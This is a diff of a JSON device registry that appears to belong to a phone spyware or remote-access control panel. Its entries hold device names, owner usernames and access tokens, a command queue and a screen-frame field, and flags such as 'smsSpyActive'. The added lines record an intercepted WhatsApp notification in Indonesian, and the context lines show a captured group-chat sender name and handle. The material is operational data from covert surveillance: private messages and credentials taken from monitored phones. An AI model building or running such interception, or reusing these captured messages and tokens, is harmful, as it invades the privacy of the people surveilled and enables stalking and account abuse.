@@ -4037,7 +4037,7 @@
     "deviceName": "HP-MEMEM-A001",
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
-    "lastSeen": 1777211840014,
+    "lastSeen": 1777211860969,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:56:32.130Z",
@@ -9337,7 +9337,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777211839349,
+    "lastSeen": 1777211860384,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -9353,6 +9353,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎11 pesan dari 3 chat",
+        "time": "26/04 21:57",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777211840758
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Senam Rappocini (7 pesan): ~ andirina0502",
